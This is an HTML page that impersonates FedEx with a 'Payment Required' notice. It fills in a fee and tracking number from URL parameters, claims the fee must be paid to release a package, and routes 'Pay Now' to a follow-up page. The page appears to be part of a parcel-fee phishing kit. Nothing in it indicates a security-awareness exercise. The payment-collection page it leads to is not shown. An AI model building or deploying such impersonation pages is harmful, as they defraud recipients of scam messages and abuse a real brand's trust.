<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>FedEx — Payment Required</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="style.css" />
  <script src="https://cdn.jsdelivr.net/npm/lucide@0.263.1/dist/lucide.min.js"></script>
  <style>
    body { background: #f4f4f4; }
    .fdx-nav {
      background: #4d148c;
      padding: 0 40px;
      height: 64px;
      display: flex;
      align-items: center;
    }
    .fdx-logo { font-size: 26px; font-weight: 900; letter-spacing: -1px; text-decoration: none; }
    .fdx-logo .fed { color: #fff; }
    .fdx-logo .ex  { color: #ff6200; }
    .payment-shell {
      min-height: calc(100vh - 64px);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }
    .payment-card {
      width: 100%;
      max-width: 480px;
      background: #fff;
      border: 1px solid #e0e0e0;
      border-radius: 8px;
      padding: 40px 36px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.08);
      text-align: center;
      animation: fadeUp 0.5s ease-out both;
    }
    .payment-icon {
      width: 60px;
      height: 60px;
      background: rgba(255,98,0,0.1);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
      color: #ff6200;
    }
    .payment-card h1 {
      font-size: 24px;
      font-weight: 900;
      letter-spacing: -0.5px;
      margin-bottom: 8px;
      color: #1a1a1a;
    }
    .payment-card .tracking-ref {
      font-size: 12px;
      color: #666;
      margin-bottom: 28px;
      letter-spacing: 0.5px;
    }
    .fee-box {
      background: #fff8f5;
      border: 2px solid #ff6200;
      border-radius: 6px;
      padding: 24px;
      margin-bottom: 28px;
    }
    .fee-label {
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      color: #666;
      margin-bottom: 8px;
    }
    .fee-amount {
      font-size: 48px;
      font-weight: 900;
      color: #ff6200;
      letter-spacing: -2px;
      line-height: 1;
    }
    .fee-note {
      font-size: 12px;
      color: #666;
      margin-top: 10px;
      line-height: 1.6;
    }
    .pay-now-btn {
      display: block;
      width: 100%;
      padding: 16px;
      background: #ff6200;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 700;
      font-family: inherit;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    .pay-now-btn:hover { background: #e55a00; }
    @media (max-width: 520px) {
      .payment-card { padding: 28px 20px; }
      .fee-amount { font-size: 40px; }
      .fdx-nav { padding: 0 20px; }
    }
  </style>
</head>
<body>
  <nav class="fdx-nav">
    <a class="fdx-logo" href="index.html"><span class="fed">Fed</span><span class="ex">Ex</span></a>
  </nav>
  <div class="payment-shell">
    <div class="payment-card">
      <div class="payment-icon">
        <i data-lucide="alert-circle" style="width:28px;height:28px;"></i>
      </div>
      <h1>Payment Required</h1>
      <p class="tracking-ref" id="trackingRef">Tracking #—</p>
      <div class="fee-box">
        <p class="fee-label">Fee Due</p>
        <p class="fee-amount" id="feeAmount">—</p>
        <p class="fee-note">This fee must be paid before your package can be released and returned to transit.</p>
      </div>
      <button class="pay-now-btn" id="payNowBtn">Pay Now</button>
    </div>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const fee = params.get('fee');
    const tracking = params.get('tracking');
    if (fee) document.getElementById('feeAmount').textContent = fee;
    if (tracking) document.getElementById('trackingRef').textContent = 'Tracking #' + tracking;
    document.getElementById('payNowBtn').addEventListener('click', () => {
      window.location.href = 'care.html?tracking=' + (tracking || '');
    });
    document.addEventListener('DOMContentLoaded', () => { if (window.lucide) lucide.replace(); });
    window.addEventListener('load', () => { if (window.lucide) lucide.replace(); });
  </script>
</body>
</html>
